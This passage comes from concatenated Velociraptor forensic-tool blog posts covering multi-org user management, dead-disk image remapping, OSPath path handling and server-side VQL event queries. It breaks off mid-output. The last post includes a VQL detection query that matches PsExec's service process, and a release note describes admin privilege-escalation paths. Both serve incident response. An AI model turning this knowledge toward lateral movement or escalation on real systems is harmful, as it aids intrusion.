as OAuth2 or SAML and not to use passwords to manage access).

![Adding a new user into the org](adding_user.png)

View the user's password in the server metadata screen. (You can remove
this entry when done with it or ask the user to change their password).

![View the new user password in the server metadata screen](server_metadata.png)

You can view all users in all orgs by collecting the
`Server.Utils.ListUsers` artifact within the root org context.

![Viewing all the users on the system](list_users.png)

{{% notice warning "User permissions and organizations" %}}

Although Velociraptor respects the assigned roles of users within an
organizations, at this stage this should not be considered as an
adequate security control. This is because there are obvious
escalation paths between roles on the same server. For example,
currently an `administrator` role by design has the ability to write
arbitrary files on the server and run arbitrary commands (primarily
this functionality allows for post processing flows with external
tools).

This is currently also the case in different organizations, so an
organization administrator can easily add themselves to another
organization or indeed to the root organization, change their own
roles etc.

Velociraptor is not designed to contain untrusted users to their own
organization unit at this stage, instead allowing administrators
flexibility and power.

{{% /notice %}}

## GUI Improvements

The 0.6.6 release introduces a number of other GUI improvements

### Updating user's passwords

Usually Velociraptor is deployed in production using SSO such as
Google's OAuth2 and in this case user's manage their password using
the provider's own infrastructure.

However it is sometimes convenient to deploy Velociraptor in `Basic`
authentication mode (for example for on-premises or air gaped
deployment). Velociraptor now offers the ability for users to change
their own passwords within the GUI.

![Users may update their passwords in the GUI](update_password.png)

### Allow notebook GUI to set notebooks to public.

Previously notebooks could be shared with specific other users but
this proved unwieldy for larger installs with many users. In this
release Velociraptor offers a notebook to be `public` - this means the
notebook will be shared with all users within the org.

![Sharing a notebook with all users](public_notebooks.png)

### More improvements to the process tracker

The experimental process tracker is described in more details
[here]({{% ref "/blog/2022/2022-08-17-process-tracker/" %}}), but you
can already begin using it by enabling the
`Windows.Events.TrackProcessesBasic` client event artifact and using
artifacts just as `Generic.System.Pstree`, `Windows.System.Pslist` and
many others.

### Context Menu

A new context menu is now available to allow sending any table cell
data to an external service.

![Sending a cell content to an external service](sendto.png)

This allows for quick lookups using `VirusTotal` or a quick
`CyberChef` analysis. You can also add your own send to items in the
configuration files.


## Conclusions

If you like the new features, take [Velociraptor for a
spin](https://github.com/Velocidex/velociraptor)!  It is a available
on GitHub under an open source license. As always please file issues
on the bug tracker or ask questions on our mailing list
[velociraptor-discuss@googlegroups.com](mailto:velociraptor-discuss@googlegroups.com)
. You can also chat with us directly on discord
[https://www.velocidex.com/discord](https://www.velocidex.com/discord)
.

---END OF FILE---

======
FILE: /content/blog/2022/2022-03-22-deaddisk/_index.md
======
---
title: "Dead disk Forensics"
description: |
   Velociraptor features some advanced forensics capabilities, but traditionally only works on live endpoints. In recent releases it is now also possible to use Velociraptor on dead disk images.

tags:
 - Forensics
 - VQL

author: "Mike Cohen"
date: 2022-03-20
---

Velociraptor's killer feature is its VQL language making it possible
to write powerful queries that triage and extract valuable forensic
evidence from the running system. One of the most attractive features
is the ability to write VQL `artifacts` encapsulating powerful VQL
queries. Users have access to a library of packaged `Artifacts` that
come with Velociraptor as well as a vibrant community and an [Artifact
Exchange]({{% ref "/exchange/" %}}).

Previously Velociraptor was most useful as a live analysis
platform. Either deployed as an agent on the live endpoint, or via the
`Offline Collector` collecting artifacts from the running
system. However, many users are sometimes faced with analyzing a dead
disk image - for example, when handed a clone of a cloud VM disk after
a compromise.

It would be really nice to be able to leverage the same VQL artifacts
developed and shared by the community on a disk image or VM clone
without having to start the VM and install Velociraptor on it.

## Dead disk analysis

When we want to analyze a disk image we mean that:

1. A VQL query that looks at a disk (e.g. via the `glob()` plugin),
   should look inside the disk image instead of the real disk of the
   analysis machine.
2. A VQL query that looks at system state (e.g. process listing)
   should fail - otherwise we will accidentally mix results from the
   analysis machine and the machine the image came from.

Consider the following scenario: I have a dead disk image (In a `vmdk`
format) of a server on my analysis machine, and I want to run
Velociraptor to triage this image.

The following query retrieves all event logs from a windows system:

```vql
SELECT OSPath
FROM glob(globs="C:/Windows/System32/WinEVT/Logs/*.evtx")
```

When I run this query, I want the results to come from the image and
**not** from my analysis machine!

Of course I can always mount my dead image on a different drive (if my
analysis machine is Windows) or a different directory (if my analysis
machine is Linux). Then I can change the query accordingly to search
for the event log files in the new location. But this is tedious and
error prone - I have to carefully change all artifacts to point to the
new drive, and if there are references in the dead image to a `C:`
drive the artifact will look for files in the `C:` drive again.

What I really want is to **remap** the `C:` drive to the dead image -
so whenever Velociraptor attempts to access a path beginning with `C:`
drive, the data will come from the image! This way I can use all the
artifacts as they are **without modification**, thereby leveraging all
my existing favorite artifacts.

## Remapping accessors

Velociraptor accesses files using [filesystem accessors]({{% ref
"/docs/forensic/filesystem/#filesystem-accessors" %}}). You can think
of an accessor as simply a driver that provides access to a file or
directory.

There are a number of types of accessors available, in the following
discussion the following accessors are important:

* The **auto** accessor is the default accessor used when an accessor
  is not explicitly specified. The query `SELECT * FROM
  glob(globs='/*')` will use the `auto` accessor since an explicit
  `accessor` parameter is not provided.

  On Windows the `auto` accessor attempts to open files using the OS
  API and failing this, reverts to NTFS parsing (for locked
  files). This is the most commonly used accessor.

* The **file** accessor uses the operating system APIs to open files
  and directories. It is used internally by the `auto` accessor but
  you can also use it explicitly.

* The **ntfs** accessor is used to access files using the built in
  NTFS parser.

{{% notice note "Supported disk image formats" %}}

Velociraptor currently supports the following 4 disk image formats via built-in
[accessors]({{< ref "/vql_reference/accessors/" >}}):

- `EWF`: Expert Witness Compression Format, sometimes called "E01 images"
- `VMDK`: virtual hard drive format introduced by VMware
- `VHDX`: virtual hard drive format introduced by Microsoft
- raw format: bit-by-bit copy of a hard drive, also know as "DD" or "flat" format

The `deaddisk` command described below recognizes the first three formats based
on *file extension* and Velociraptor is able to read these formats natively
without any additional steps. If the target image file has any other extension
then the `deaddisk` command will treat it as raw format.

If you have any other image format then the recommended course of action is to
"cross-mount" the image to raw format. There are several tools which can do
this, for example [xmount](https://www.pinguin.lu/xmount). Alternatively you can
convert the image to one of the natively-supported formats, and many tools exist
which can do that. The downside of converting formats is that it requires a lot
of disk space and can take a long time, therefore cross-mounting is preferable
because it "translates" one format to another without conversion.

Most virtual machine platforms can usually export to several formats. In
particular note that VMware can export for raw format (also called "flat") but
retains the `.vmdk` file extension. In that case you would need to remove the
file extension so that Velociraptor's `deaddisk` command will treat it as a raw
image instead of VMDK format.

{{% /notice %}}

## Remapping configuration

Velociraptor normally interrogates the live machine it is running
on. However in this case we want to emulate the system under
investigation so that when Velociraptor attempts to access the system
it is really parsing the dead disk image. This process of emulation is
called `remapping` and it is controlled via remapping rules in the
configuration file.

Although I can write these rules by hand, Velociraptor offers a quick
tool that automates a lot of the remapping rule generation. Simply
point velociraptor at the image file using the
`--add_windows_disk` flag, and it will produce a new remapping yaml
config:

```
$ velociraptor-linux-amd64 -v deaddisk --add_windows_disk /mnt/flat /tmp/remapping.yaml
velociraptor: Enumerating partitions using Windows.Forensics.PartitionTable
velociraptor: Searching for a Windows directory at the top level
velociraptor: Adding windows partition at offset 122683392
velociraptor: Searching for a Windows directory at the top level
```

Velociraptor will enumerate the partitions in the disk image and
attempt to mount each as an NTFS partition. It will then look for a
`/Windows` directory at the top level to indicate a system drive and
map it to the `C:` drive.

You can see the full generated configuration file
[here](https://gist.github.com/scudette/ffcd3ed2e589ebbdbe5c3edcf3914176)
but in the next few sections we will examine some remapping rules in
detail.

### The "mount" remapping rules

Let's take a closer look at the following rule of type `mount`

```yaml
- type: mount
  description: 'Mount the partition /mnt/flat (offset 122683392) on the C:
    drive (NTFS)'
  from:
    accessor: raw_ntfs
    prefix: |
      {
        "DelegateAccessor": "offset",
        "Delegate": {
          "DelegateAccessor": "file",
          "DelegatePath": "/mnt/flat",
          "Path":"122683392"
        },
        "Path": "/"
      }
  "on":
    accessor: ntfs
    prefix: '\\.\C:'
    path_type: ntfs
```

A `mount` rule tells Velociraptor to map all paths below a certain
directory to a delegate accessor. When a VQL query attempts to open a
file using the `ntfs` accessor, below the `\\.\C:` directory,
Velociraptor will automatically map the request to `raw_ntfs` accessor
with the above prefix.

For example, consider the request to list the `\\.\C:\Windows`
directory. Since this directory is below the mount point of `\\.\C:`,
Velociraptor will append the remainder (the `Windows` directory) to
the mount point's `from` prefix and use the `raw_ntfs` accessor to
list the result.

So the following pathspec will be opened instead:

```json
      {
        "DelegateAccessor": "offset",
        "Delegate": {
          "DelegateAccessor": "file",
          "DelegatePath": "/mnt/flat",
          "Path":"122683392"
        },
        "Path": "/Windows"
      }
```

The prefix is an OSPath object in the form of a complete pathspec
object describing how the `raw_ntfs` accessor is to access files:

1. The `raw_ntfs` accessor will first open it's delegate container and
   then parse out the `/Windows` path within it.
2. The delegate is the `offset` accessor - an accessor that maps an
   offset from it's own delegate (in order to extract the partition on
   which the filesystem is written).
3. The `offset` accessor in turn uses the `file` accessor to open the
   `/mnt/flat` image file. In this case the offset is 122683392 bytes
   into the image.

This remapping happens transparently - whenever Velociraptor accesses
the `ntfs` accessor the data will be automatically taken from the
remapped mount point.

Let's see how this works in practice. I will start the GUI using:

```
$ velociraptor-v0.6.4-linux-amd64 --remap /tmp/remapping.yaml gui -v
```

This simply starts the Velociraptor server and a single client talking
to it. However, due to the `--remap` flag, the remapping configuration
will be applied to both client and server configurations.

Now when I interact with the client's VFS view due to the remapping
the result comes from the `vmdk` image.

![Browsing the VFS with the remapped ntfs accessor](ntfs_accssor_vfs.png)

### Remapping the registry hives

The above default remapping rules also include the following rule

```yaml
- type: mount
  description: Map the /Windows/System32/Config/SOFTWARE Registry hive on HKEY_LOCAL_MACHINE\Software
  from:
    accessor: raw_reg
    prefix: |-
      {
        "Path": "/",
        "DelegateAccessor": "raw_ntfs",
        "Delegate": {
          "DelegateAccessor":"offset",
          "Delegate": {
            "DelegateAccessor": "file",
            "DelegatePath": "/mnt/flat",
            "Path": "122683392"
          },
          "Path":"/Windows/System32/Config/SOFTWARE"
        }
      }
    path_type: registry
  "on":
    accessor: registry
    prefix: HKEY_LOCAL_MACHINE\Software
    path_type: registry
```

This rule mounts the `registry` accessor's
`HKEY_LOCAL_MACHINE\Software` path on the
`/Windows/System32/Config/SOFTWARE` file found within the raw NTFS
partition.  Note how pathspec descriptors nest and can utilize
multiple different accessors to achieve the final mount point (in this
case, the `file` accessor, followed by `offset` followed by `raw_ntfs`
followed by `raw_registry`)..

![Browsing the VFS with registry accessors](reg_accssor_vfs.png)

Normally, when interacting with a live Velociraptor client, the
`registry` accessor refers to registry keys and values accessed
through the OS API. However now we were able to mount a raw registry
parser on top of the `registry` accessor.

{{% notice note "What does remapping achieve?" %}}

By remapping the traditional accessors with emulated content, we are
effectively allowing the same VQL queries to apply to very different
scenarios **without change**. For example, an artifact that queries
the registry using the API will now automatically query the raw
registry parser which accesses the hive file as recovered from parsing
the ntfs filesystem on a dead disk image.

We can apply the same artifacts to the dead disk image without any
modification!

{{% /notice %}}

### Remapping CurrentControlSet

In Windows there are virtual parts of the registry that get remounted
at runtime. One such part is the
`HKEY_LOCAL_MACHINE\Software\CurrentControlSet` key which is mounted
from `HKEY_LOCAL_MACHINE\Software\ControlSet001`. Velociraptor can recreate this mapping using the following remapping rule:

```yaml
- type: mount
  description: Map the /Windows/System32/Config/SYSTEM Registry hive on HKEY_LOCAL_MACHINE\System\CurrentControlSet
    (Prefixed at /ControlSet001)
  from:
    accessor: raw_reg
    prefix: |-
      {
        "Path": "/ControlSet001",
        "DelegateAccessor": "raw_ntfs",
        "Delegate": {
          "DelegateAccessor":"offset",
          "Delegate": {
            "DelegateAccessor": "file",
            "DelegatePath": "/mnt/flat",
            "Path": "122683392"
          },
          "Path":"/Windows/System32/Config/SYSTEM"
        }
      }
    path_type: registry
  "on":
    accessor: registry
    prefix: HKEY_LOCAL_MACHINE\System\CurrentControlSet
    path_type: registry
```

This is very important for queries that read sub-keys of `CurrentControlSet`.

### Impersonating an operating system

We discussed how accessors can be remapped using the remapping rules
in order to make VQL plugins that access files emulate running on the
target system. However, many artifacts need to examine more than just
the filesystem. For example, most artifacts have a `precondition` such
as `SELECT * FROM info() WHERE OS =~ "Windows"`. If we were to run on
a Linux system these artifacts will not work since they are intended
to work on windows - despite the remapping rules emulating a Windows
system.

We therefore need to `impersonate` a windows system - even when we are
really running on a Linux machine. The impersonation rule looks like:

```yaml
- type: impersonation
  os: windows
  hostname: VirtualHostname
  env:
  - key: SystemRoot
    value: C:\Windows
  - key: WinDir
    value: C:\Windows
  disabled_functions:
  - amsi
  - lookupSID
  - token
  disabled_plugins:
  - users
  - certificates
  - handles
  - pslist
```

This rule has a number of functions

1. The OS type is set to Windows- This affects the output from
   `SELECT * FROM info()` - this query controls most of the artifact
   preconditions.
2. A specific hostname is set to "VirtualHostname". When the client
   interrogates, this hostname will appear in the Velociraptor GUI.

3. We specify a number of environment variables. This affects the
   `expand()` function which expands paths using environment
   variables. Many artifacts use environment variables to locate files
   within the filesystem.
4. Disabled functions and plugins: Many artifacts use plugins and
   functions that query non-disk system state in order to enrich the
   collected data. I.e. their output does not depend just on the
   disk. Using this impersonation rule we can disable those plugins
   and functions (essentially return nothing from them) so the query
   can complete successfully.

Impersonation aims to make it appear that the VQL artifacts are being
collected from the target system as if it were running live.

Here is an example of collecting some common Windows artifacts from my
flat image above - running on a Linux analysis machine. We can see
some of our favorite artifacts, such as `Windows.Forensics.Usn`,
`Windows.Timeline.Prefetch`, `Windows.Forensics.Bam` and many more.

![Collecting some common artifacts](artifacts_prefetch.png)


## Analysis of non windows disk images

In the previous example, we exported the `vmdk` image as a flat file
and simply relied on Velociraptor to parse the filesystem using its
inbuilt NTFS parser.

For other operating systems, Velociraptor does not currently have a
native parser (for example for Linux or MacOS). Instead, Velociraptor
relies on another tool mounting the image filesystem as a directory.

We can still perform the analysis as before however, by remapping the
mounted directory instead of a raw image.

To demonstrate this process I will mount the flat image using the
Linux loopback driver and the built in Linux NTFS filesystem support.

```
$ sudo mount -o loop,offset=122683392 /mnt/flat /tmp/mnt/
```

I can now generate a second remapping configuration:

```
$ ./velociraptor-v0.6.4-linux-amd64 deaddisk --add_windows_directory /tmp/mnt/ /tmp/remapping2.yaml
velociraptor: Adding windows mounted directory at /tmp/mnt/
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SOFTWARE
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SYSTEM
velociraptor: Checking for hive at /tmp/mnt/Windows/System32/Config/SYSTEM
```

Velociraptor will inspect the directory and determine it is a Windows
image, then attempt to map the raw registry hives at the correct place
as before. The `C:` drive remapping rule is:

```yaml
- type: mount
  description: 'Mount the directory /tmp/mnt/ on the C: drive (NTFS)'
  from:
    accessor: file
    prefix: /tmp/mnt/
  "on":
    accessor: file
    prefix: 'C:'
    path_type: windows
```

## Conclusions

Velociraptor is an extremely capable triage and analysis tool which
works best when running live on the endpoint - where it can correlate
information from disk, memory and volatile system state. Velociraptor
has a vibrant community with powerful user contributed artifacts
designed for use in this context.

However, sometimes we do not have the luxury of running directly on
the running endpoint, but have to rely instead on dead disk images of
the target system. The latest Velociraptor release makes it possible
to impersonate a live system based on information from the dead
disk. While this is not perfect (because a lot of the enrichment
information obtained from the live system is missing) for basic disk
focused forensic analysis, we are able to use most artifacts directly
without change.

This feature opens Velociraptor to more traditional image based
forensic analysis use cases - these users are now able to leverage the
same artifacts we all use in live triage to quickly triage dead disk
images.

Since this is such a new feature it is still considered experimental -
we value your feedback, bug reports and discussions.  If you would
like to try out these features in Velociraptor, It is available on
GitHub under an open source license. As always, please file issues on
the bug tracker or ask questions on our mailing list
velociraptor-discuss@googlegroups.com. You can also chat with us
directly on discord at https://www.velocidex.com/discord.

---END OF FILE---

======
FILE: /content/blog/2022/2022-03-21-paths/_index.md
======
---
title: "Paths and filesystem accessors"
description: |
   Path handling seems like a simple task but it is surprisingly complex. This article discusses some of the nuances of thinking about paths and introduces Velociraptor's new OSPath feature that easier path manipulation from VQL queries.

tags:
 - Forensics
 - VQL

author: "Mike Cohen"
date: 2022-03-20
---

{{% notice note %}}

This article discusses a feature available since 0.6.4 release.

{{% /notice %}}

Path handling is fundamental to forensic analysis, as a large amount
of relevant information is still kept on disk within a
filesystem. Superficially, We are all familiar with how paths work - a
path is typically a string that we can provide to some OS API (for
example the Windows `CreateFile()` or Linux `open()` API) which
facilitates interacting with a file or a directory on the filesystem.

Unfortunately, the structure of this string is often not well defined
or consistent between operating systems! For example, on windows a
path has the following characteristics:

1. The path starts with a "drive letter" of the form `C:` or `D:`
2. Path directories are separated by a backslash `\`
3. There is no leading path separator (`C:\` does not start with `\`).
4. Directory names may not contain forward slashes, backslashes or wildcards.
5. Filenames are generally case insensitive.

For example `C:\Windows\System32\Notepad.exe`

On Linux things are a bit different:

1. Paths begin with the slash character (the root of the filesystem)
2. Path directories are separated by forward slash
3. Directory names may contain backslashes but these are **not** path
   separators! Filename may contain pretty much any character (except
   null and forward slash).

For example, a path looks like `/usr/bin/ls`. However, since Linux can
have backslashes with filenames, the path `/C:\Windows/System32` can
actually refer to a single directory named `C:\Windows`!

It gets even more complicated on windows, where a `device name` may
appear as the first element of the path where it refers to a physical
device for example `\\.\C:\Windows` means the `Windows` directory
inside the filesystem on the device `\\.C:` - Yes the device can
contain backslashes which are also path separators **except** when
they refer to a device.

A registry path has other rules:

1. It starts with the hive name, e.g. `HKEY_LOCAL_MACHINE` or `HKLM`
2. Components are separated by backslashes
3. While key names are analogous to directories, registry keys are
   allowed to have forward slash characters.
4. While Value name are analogous to files, value name may also have
   backslashes!

For example the following registry path is valid
`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\` `Windows
Presentation
Foundation\Namespaces\http://schemas.microsoft.com/netfx/2009/xaml/presentation`
(with the last registry key being a URL) even though the registry key
contains forward slashes it is just one key component!

With all these confusing rules we need to develop an abstraction that
allows Velociraptor to handle all these cases correctly.

## The OSPath abstraction

Recent Velociraptor releases, introduced the `OSPath` abstraction to
handle various paths:

1. Internally paths are always a list of components. For example, the
   windows path `C:\Windows\System32` is represented internally as the
   list of components `["C:", "Windows", "System32"]`

2. A Filesystem is treated as a tree, and the path is simply the list
   of components connecting each level in the tree.

3. An `OSPath` implements specific serialization and deserialization
   methods: When we need to pass an OSPath object to the OS API we
   need to serialize the abstract OSPath in a way that is appropriate
   to the OS. Otherwise we prefer to retain the OSPath as an abstract
   path as much as possible.

4. Each `OSPath` has a specific flavor - controlling for the way it is
   serialized to and from a string.

For example, an OSPath with the following components `["C:",
"Windows", "System32"]` will serialize to string:

* A Windows `OSPath` will serialize to `C:\Windows\System32`
* A Linux `OSPath` will serialize to `/C:/Windows/System32`
* A Windows NTFS aware OSPath will serialize to
  `\\.\C:\Windows\System32` (i.e. device notation appropriate to the
  NTFS raw accessor).

## The glob() plugin

One of the most commonly used plugins in Velociraptor is the `glob()`
plugin. This plugin allows searching of filesystems using a glob
expression (containing wildcards).

Consider the following query running on windows

```vql
SELECT OSPath
FROM glob(globs="C:\\Windows\\*")
```

The `glob()` plugin applies the glob expression on the filesystem and
returns a single row for each matching file. Since release `0.6.4`,
the raw `OSPath` object is also available within VQL. While it may
appear that it is a simple string when serialized to JSON, it is in
fact an object with many convenient methods.

![The OSPath object](ospath.png)

The OSPath object has some convenient properties:

* The `Components` field contains the list of path components in the
  path. You can index the component to identify a specific directory
  or filename.  (negative indexes are counted from the end of the
  component array).

* The `Basename` property is a shorthand to the last component
  (equivalent to `OSPath.Components[-1]`)

* The `Dirname` property is an OSPath representing the directory
  containing the OSPath.

* Path manipulation is very easy to do, since OSPath is overloading
  the addition operator. The expression `OSPath.Dirname +
  "explorer.exe"` produces another OSPath obtained by appending the
  `explorer.exe` component to the directory of the current OSPath.


## Filesystem accessors and OSPath

Velociraptor accesses filesystems by way of an `accessor`. You can think
of an accessor as a specific driver that VQL can use to open a
path. All VQL plugins or functions that accept files will also accept
an accessor to use to open the file.

Consider the following VQL query:

```vql
SELECT read_file(path="C:/Windows/notepad.exe", accessor="file")
FROM scope()
```

The `read_file()` VQL function reads raw data from the specified
file. It will call onto the "file" accessor and pass the provided path
to it as an opaque string.

The `file` accessor is used to open files using the OS
APIs. Therefore, it will interpret the path string according to the OS
convention it is running on (i.e. on Windows it will create a Windows
flavor of OSPath). However, were we to use another accessor, the
string path will be interpreted differently by the accessor.

{{% notice note "Interpreting paths" %}}

The most important takeaway from this is that when an accessor
receives a string path, it will parse it into an OSPath internally
according to its own rules.

When an accessor receives an already parsed OSPath object, it may
directly use it (since no parsing is required). Therefore in general,
once an OSPath object is produced in the query, the same OSPath object
should be passed around to other plugins/vql functions.

```vql
SELECT read_file(filename=OSPath, accessor="file", length=5)
FROM glob(globs="C:\\Windows\\notepad.exe")
```

{{% /notice %}}


## Nested accessors and pathspecs

Many VQL accessors require additional information to be able to
work. For example consider the `zip` accessor. This accessor is used
to read zip archive members as if they were simple files. In order to
open an archive member we need several pieces of information:

1. The path to the zip file itself.
2. An accessor to use to open the zip file container.
3. The path to the zip member inside the container to open.

The `zip` accessor therefore requires a more complex OSPath object
containing additional information about the `Delegate` (i.e. the path
and accessor that the zip accessor will delegate the actual reading
to). We call this more complex path specification a `pathspec` as it
specifies more precisely what the accessor should do. In a VQL query
we may build a pathspec from scratch using the `pathspec` function.

```vql
SELECT read_file(
  filename=pathspec(DelegateAccessor="file",
                    DelegatePath="F:/hello.zip",
                    Path="/hello.txt"),
  accessor="zip", length=5)
FROM scope()
```

In the above example I am calling the `read_file()` VQL function, and
building an OSPath object directly using the `pathspec()` VQL
function.

The `zip` accessor receives the new OSPath object and

1. Will open the zip container itself using the `Delegate`: i.e. the
   "file" accessor, with a path of "F:/hello.zip".
2. After parsing the zip file, the `zip` accessor will open the member
   within it specified by the `Path` field. For zip files, the path is
   interpreted as a forward slash separated unix like path (according
   to the zip specification). In this case the zip accessor will open
   a member called `hello.txt`.

## Nesting OSPath objects.

We can combine the previous two queries to search zip files

```vql
SELECT OSPath,
   read_file(filename=OSPath, accessor="zip", length=5)
FROM glob(
  globs="/*.txt",
  root=pathspec(DelegateAccessor="file", DelegatePath="F:/hello.zip", Path="/"),
  accessor="zip")
```

This time we provide the `glob()` plugin the root (where searching
will begin) as a full OSPath object that we construct to represent the
top level of the zip archive (i.e. globing will proceed within the zip
file).

We can transparently now pass the OSPath object that glob will return
directly into any VQL function or plugin that accepts a file
(e.g. `read_file()`)

![Handling nested OSPath objects](nested_pathspec.png)

The OSPath object is now capable of more complex path manipulations:

1. The `OSPath.Dirname` property represents the fully qualified OSPath
   used to represent the container directory - we can simply pass it
   directly to any plugins that deal with directories.

2. Note that more complex `Pathspec` based paths are represented as a
   JSON encoded object. It is ok to pass the stringified version the
   OSPath around to plugins because they will automatically parse the
   string into an OSPath object.

{{% notice warning "Glob's root parameter" %}}

In previous versions of Velociraptor it was possible to pass a
pathspec to the glob parameter (e.g. to glob within a zip file)
however since 0.6.4 this is not allowed. Glob expressions are always
flat strings (i.e. a glob is not a pathspec). A pathspec is allowed to
be passed to the root parameter to indicate where searching should
start from.

{{% /notice %}}

## Compatibility with previous releases

Previously the `glob()` plugin would emit the `FullPath` column as a
string representing the serialized version of each file. This string
was passed to other plugins/vql functions which parsed it again. This
lead to a lot of unnecessary path serialization and parsing, but more
importantly it was difficult to maintain the correct "flavor" of the
path throughout the query and required a lot of complex path
manipulations to extract specific parts of the path.

It should be more efficient to pass the raw OSPath object everywhere
the old FullPath was used. However 0.6.4 onward still provide the
FullPath column for backwards compatibility. The overall effect is
that artifacts originally written for older versions of VQL should
continue to work on 0.6.4. However newer artifacts written for 0.6.4
will not run on older clients.

Previously nested paths were encoded with URLs, but this is now
deprecated and future VQL queries should not use URLs to encode nested
paths.

{{% notice warning "Supporting older clients" %}}

Many people upgrade their Velociraptor server more frequently than
their clients. Usually, newer versions of Velociraptor maintains
reasonable backwards compatibility with older clients so most things
continue to work. However in 0.6.4, the introduction of the `OSPath`
column means that newer artifacts will fail on older clients (since
VQL is evaluated on the client).
See our [Support Policy]({{% ref "/docs/overview/support/" %}})

To help with the migration process, we made the older versions of
artifacts easily available in newer servers. If you still have older
clients deployed, you should import older VQL artifacts into `0.6.4`
server using the `Server.Import.PreviousReleases` server
artifact. This will import the old artifacts under a name reflecting
their version so they may be collected from older clients.

{{% /notice %}}

## Conclusions

Path representation is surprisingly much more complex that it first
appears. While paths are strings, internally Velociraptor treats them
as a sequence of components with different flavors controlling how
they are serialized and represented. This affords the VQL query a more
powerful way to manipulate paths and build new paths based on them.

For more complex accessors, paths are represented as a JSON serialized
`pathspec` object, describing a delegate container path as well. Using
the `OSPath` object methods does the right thing even for more complex
path and makes it a lot easier to manipulate (for example
`OSPath.Dirname` is a valid and correct `OSPath` for the containing
directory, even for more complex pathspec based paths)

---END OF FILE---

======
FILE: /content/blog/html/2018/12/10/server_side_vql_queries_and_events/_index.md
======
---
date: 2018-12-10T04:10:06Z
description:  |
  It is also possible to run VQL
  queries on the server side! Similarly server side Velociraptor
  artifacts can be used to customize the operation of the server -
  without modifying any code or redeploying the server components.

title: Server side VQL queries and Escalation Events
categories: ["Blog"]
---


Previously we have seen how Velociraptor collects information from end
points using Velociraptor artifacts. These artifacts encapsulate user
created queries using the Velociraptor Query Language (VQL). The power
of VQL is that it provides for a very flexible way of specifying exactly
what should be collected from the client and how - without needing to
modify client code or deploy new clients!

This is not the whole story though! It is also possible to run VQL
queries on the server side! Similarly server side Velociraptor artifacts
can be used to customize the operation of the server -without modifying
any code or redeploying the server components.

Server Side VQL Queries.
========================

By now you are probably familiar with Velociraptor and VQL. We have seen
that it is possible to run a VQL query interactively from the
commandline. For example to find all processes matching the \'gimp\':

``` {.sourceCode .bash}
$ velociraptor query \
   "SELECT Pid, Exe, Cmdline FROM pslist() WHERE Exe =~ 'gimp'"
[
 {
  "Cmdline": "gimp-2.10",
  "Exe": "/usr/bin/gimp-2.10",
  "Pid": 13207
 }
]
```

We have used this feature previously in order to perfect and test our
queries by interactively building the query as we go along.

However it is also possible to run queries on the server itself in order
to collect information about the server. There is nothing special about
this as such - it is simply that some VQL plugins are able to operate on
the server\'s internal data store and therefore provide a way to
interact with the server via VQL queries.

::: {.note}
::: {.admonition-title}
Note
:::

Other endpoint monitoring tools export a rich API and even an API client
library to enable users to customize and control their installation. For
example, GRR expects users write python scripts using the GRR client API
library.

Velociraptor\'s approach is different - the functionality typically
available via APIs is made available to VQL queries via VQL plugins
(e.g. client information, flow information and results collected). In
this way the VQL itself forms an API with which one controls the server
and deployment. There is no need to write any code - simply use existing
VQL plugins in any combination that makes sense to create new
functionality - then encapsulates these queries inside Velociraptor
artifacts for reuse and sharing.
:::

For example, to see all the clients and their hostnames:

``` {.sourceCode .bash}
$ velociraptor query \
   "SELECT os_info.fqdn as Hostname, client_id from clients()" --format text
+-----------------+--------------------+
|    Hostname     |     client_id      |
+-----------------+--------------------+
| mic-Inspiron    | C.772d16449719317f |
| TestComputer    | C.11a3013cca8f826e |
| trek            | C.952156a4b022ddee |
| DESKTOP-IOME2K5 | C.c916a7e445eb0868 |
+-----------------+--------------------+
SELECT os_info.fqdn AS Hostname,
client_id FROM clients()
```

To inspect what flows were run on a client:

``` {.sourceCode .bash}
$ velociraptor query \
   "SELECT runner_args.creator, runner_args.flow_name, \
    runner_args.start_time FROM \
    flows(client_id='C.772d16449719317f')"
[
{
  "runner_args.creator": "",
  "runner_args.flow_name": "MonitoringFlow",
  "runner_args.start_time": 1544338661236625
},
{
  "runner_args.creator": "mic",
  "runner_args.flow_name": "VFSDownloadFile",
  "runner_args.start_time": 1544087705756469
},
...
```

Client Event Monitoring
=======================

We have also previously seen that Velociraptor can collect event streams
from clients. For example, the client\'s process execution logs can be
streamed to the server. Clients can also receive event queries which
forward selected events from the windows event logs.

When we covered those features in earlier blog posts, we stressed that
the Velociraptor server does not actually do anything with the client
events, other than save them to a file. The server just writes the
client\'s events in simple Comma Separated files (CSV files) on the
server.

We mentioned that it is possible to import this file into another tool
(e.g. a spreadsheet or database) for post-processing. An alternative is
to perform post-processing with Velociraptor itself using server side
VQL queries.

For example, we can filter a client\'s process execution log using a VQL
query:

``` {.sourceCode .bash}
$ velociraptor query "SELECT * from monitoring(
      client_id='C.87b19dba006fcddb',
      artifact='Windows.Events.ProcessCreation')
    WHERE Name =~ '(?i)psexesvc' "
[
 {
  "CommandLine": "\"C:\\\\Windows\\\\PSEXESVC.exe\"",
  "Name": "\"PSEXESVC.exe\"",
  "PID": "452",
  "PPID": "512",
  "Timestamp": "\"2018-12-09T23:30:42-08:00\"",
  "artifact": "Windows.Events.ProcessCreation",
  "client_id": "C.87b19dba006fcddb"
 }
]
```

The above query finds running instances of psexec\'s service component -
a popular method of lateral movement and privilege escalation.

This query uses the monitoring() VQL plugin which opens each of the CSV
event monitoring logs for the specified artifact on the server, decodes
the CSV file and emits all the rows within it into the VQL Query. The
rows are then filtered by applying the regular expression to the name.

Server side event queries
=========================

VQL queries do not have to terminate at all. Some VQL plugins can run
indefinitely, emitting rows at random times - usually in response to
some events. These are called Event Queries since they never terminate.
We saw this property when monitoring the client - the above
Windows.Events.ProcessCreation artifact uses an event query which emits
a single row for each process execution on the end point.

However, we can also have Event Queries on the server. When used in this
way the query triggers in response to data collected by the server of
various clients.

For example, consider the above query to detect instances of psexec
executions. While we can detect this by filtering existing monitoring
event logs, it would be nice to be able to respond to such an event
dynamically.

One way is to repeatedly run the same query (say every minute) and look
for newly reported instances of psexec executions. But this approach is
not terribly efficient. A better approach is to install a watcher on the
monitoring event log:

``` {.sourceCode .bash}
$ velociraptor query "SELECT * from watch_monitoring(
     client_id='C.87b19dba006fcddb',
     artifact='Windows.Events.ProcessCreation') where Name =~ '(?i)psexesvc' "
[
 {
  "CommandLine": "\"C:\\\\Windows\\\\PSEXESVC.exe\"",
  "Name": "\"PSEXESVC.exe\"",
  "PID": "4592",
  "PPID": "512",
  "Timestamp": "\"2018-12-10T01:18:06-08:00\"",
